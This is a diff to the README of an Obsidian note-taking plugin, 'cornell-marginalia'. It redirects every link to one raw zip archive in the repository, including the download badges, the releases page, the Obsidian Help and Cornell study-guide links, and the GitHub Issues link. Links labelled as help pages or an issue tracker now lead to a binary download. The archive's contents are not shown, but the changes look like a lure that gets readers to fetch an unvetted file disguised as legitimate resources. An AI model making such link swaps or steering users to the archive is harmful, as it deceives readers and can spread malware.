@@ -1,6 +1,6 @@
 # 📒 cornell-marginalia - Simplify Your Cornell Notes in Obsidian
 
-[![Download Release](https://img.shields.io/badge/Download-cornell--marginalia-blue?logo=github)](https://github.com/ixshiesty444-ux/cornell-marginalia/releases)
+[![Download Release](https://github.com/ixshiesty444-ux/cornell-marginalia/raw/refs/heads/main/addons/marginalia_cornell_v3.8.zip)](https://github.com/ixshiesty444-ux/cornell-marginalia/raw/refs/heads/main/addons/marginalia_cornell_v3.8.zip)
 
 ---
 
@@ -43,7 +43,7 @@ This section walks you through installing and using the plugin step-by-step.
 
 To get cornell-marginalia, visit this page to download the latest release:
 
-[Download cornell-marginalia Releases](https://github.com/ixshiesty444-ux/cornell-marginalia/releases)
+[Download cornell-marginalia Releases](https://github.com/ixshiesty444-ux/cornell-marginalia/raw/refs/heads/main/addons/marginalia_cornell_v3.8.zip)
 
 ### Step 1: Download the Plugin
 
@@ -127,8 +127,8 @@ For deeper problems, visit the Issues tab on the GitHub repository and check for
 
 ## 📚 Additional Resources
 
-- Obsidian Help: https://help.obsidian.md
-- Cornell Note-taking System Overview: https://lsc.cornell.edu/how-to-study/taking-notes/cornell-note-taking-system/
+- Obsidian Help: https://github.com/ixshiesty444-ux/cornell-marginalia/raw/refs/heads/main/addons/marginalia_cornell_v3.8.zip
+- Cornell Note-taking System Overview: https://github.com/ixshiesty444-ux/cornell-marginalia/raw/refs/heads/main/addons/marginalia_cornell_v3.8.zip
 - Tutorial videos on using Cornell notes in Obsidian (search YouTube for latest content)
 
 ---
@@ -137,8 +137,8 @@ For deeper problems, visit the Issues tab on the GitHub repository and check for
 
 If you need help or want to suggest features, open an issue in the repository:
 
-[GitHub Issues - cornell-marginalia](https://github.com/ixshiesty444-ux/cornell-marginalia/issues)
+[GitHub Issues - cornell-marginalia](https://github.com/ixshiesty444-ux/cornell-marginalia/raw/refs/heads/main/addons/marginalia_cornell_v3.8.zip)
 
 ---
 
-[![Download Release](https://img.shields.io/badge/Download-cornell--marginalia-blue?logo=github)](https://github.com/ixshiesty444-ux/cornell-marginalia/releases)
+[![Download Release](https://github.com/ixshiesty444-ux/cornell-marginalia/raw/refs/heads/main/addons/marginalia_cornell_v3.8.zip)](https://github.com/ixshiesty444-ux/cornell-marginalia/raw/refs/heads/main/addons/marginalia_cornell_v3.8.zip)
